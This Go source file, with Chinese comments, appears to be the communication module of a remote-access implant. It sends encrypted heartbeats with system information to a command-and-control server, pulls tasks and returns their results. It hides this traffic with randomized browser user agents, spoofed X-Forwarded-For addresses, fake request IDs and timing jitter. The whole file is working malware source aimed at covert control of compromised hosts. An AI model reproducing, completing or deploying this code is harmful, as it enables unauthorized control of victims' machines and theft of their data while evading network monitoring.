package main

import (
	"bytes"
	"crypto/md5"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"time"
)

// 全局配置（main.go 启动时设置）
var cfg *Config

// 流量伪装参数（与 agent.py TRAFFIC_STEGO 一致）
const (
	trafficStego  = true
	packetJitter  = 0.3
	stegoProb     = 0.7
)

// buildStegoHeaders 构造伪装请求头（含加密算法标识），与 agent.py _build_stego_headers 对齐
func buildStegoHeaders(algo string) http.Header {
	h := http.Header{}
	h.Set("Content-Type", "text/plain")
	h.Set("X-Enc-Algo", algo)
	h.Set("X-Trace-ID", hexMD5(strconv.FormatFloat(float64(time.Now().UnixNano())/1e9, 'f', -1, 64)))
	h.Set("X-Request-ID", strconv.Itoa(rand.Intn(90000)+10000))
	h.Set("User-Agent", randomChromeUA())
	h.Set("Accept", "text/plain, */*")
	h.Set("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8")
	h.Set("Accept-Encoding", "gzip, deflate, br")
	h.Set("Connection", "keep-alive")
	if rand.Float64() < 0.5 {
		h.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d",
			rand.Intn(223)+1, rand.Intn(256), rand.Intn(256), rand.Intn(256)))
	}
	return h
}

func randomChromeUA() string {
	return fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/%d.%d (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/%d.%d",
		rand.Intn(101)+500, rand.Intn(100), rand.Intn(21)+100, rand.Intn(101)+500, rand.Intn(100))
}

func hexMD5(s string) string {
	h := md5.Sum([]byte(s))
	return fmt.Sprintf("%x", h)
}

// httpPost 发送加密 POST 请求并解密响应，返回解析后的 map
// 与 agent.py http_post 行为一致: 加密请求体 + 伪装头 + 解密响应
func httpPost(path string, data interface{}) map[string]interface{} {
	url := cfg.C2Server + path
	body, algo, err := encEncrypt(data, cfg.EncAlgo, cfg.EncPassword)
	if err != nil {
		return nil
	}
	headers := buildStegoHeaders(algo)
	// 抖动（模拟流量伪装的随机延迟）
	if trafficStego && rand.Float64() < stegoProb {
		time.Sleep(time.Duration(rand.Float64()*packetJitter*1000) * time.Millisecond)
	}
	req, err := http.NewRequest("POST", url, bytes.NewBufferString(body))
	if err != nil {
		return nil
	}
	req.Header = headers
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}
	if resp.StatusCode != 200 {
		return nil
	}
	return decryptResponse(string(raw), resp.Header.Get("X-Enc-Algo"))
}

// decryptResponse 从 HTTP 响应解密数据，返回 map
// 与 agent.py _decrypt_response 一致:
//   - 有 X-Enc-Algo 且非 none → 用该算法解密后 JSON 解析
//   - 无加密头 → 先尝试明文 JSON，再尝试 base64(none) 解码
func decryptResponse(text, respAlgo string) map[string]interface{} {
	a := strings.ToLower(strings.TrimSpace(respAlgo))
	if a == "" {
		a = "none"
	}
	if a != "none" {
		dec, err := encDecrypt(text, a, cfg.EncPassword)
		if err != nil {
			return nil
		}
		var m map[string]interface{}
		if err := json.Unmarshal(dec, &m); err != nil {
			return nil
		}
		return m
	}
	// none 模式: 服务端返回 base64(JSON)（因为我们请求时带了 X-Enc-Algo: none）
	dec, err := encDecrypt(text, "none", cfg.EncPassword)
	if err == nil {
		var m map[string]interface{}
		if err := json.Unmarshal(dec, &m); err == nil {
			return m
		}
	}
	// 兼容: 直接明文 JSON
	var m map[string]interface{}
	if err := json.Unmarshal([]byte(text), &m); err == nil {
		return m
	}
	return nil
}

// heartbeat 发送心跳，携带系统信息
func heartbeat() map[string]interface{} {
	info := getSystemInfo()
	info["client_id"] = cfg.ClientID
	return httpPost("/agent/heartbeat", info)
}

// pullTasks 拉取待处理任务列表
func pullTasks() []map[string]interface{} {
	result := httpPost("/agent/pull", map[string]interface{}{"client_id": cfg.ClientID})
	if result == nil {
		return nil
	}
	tasks, ok := result["tasks"].([]interface{})
	if !ok {
		return nil
	}
	out := make([]map[string]interface{}, 0, len(tasks))
	for _, t := range tasks {
		if m, ok := t.(map[string]interface{}); ok {
			out = append(out, m)
		}
	}
	return out
}

// submitResult 回传任务执行结果
func submitResult(taskID interface{}, result string, status string) {
	if status == "" {
		status = "completed"
	}
	httpPost("/agent/result", map[string]interface{}{
		"task_id":   taskID,
		"client_id": cfg.ClientID,
		"status":    status,
		"result":    result,
	})
}
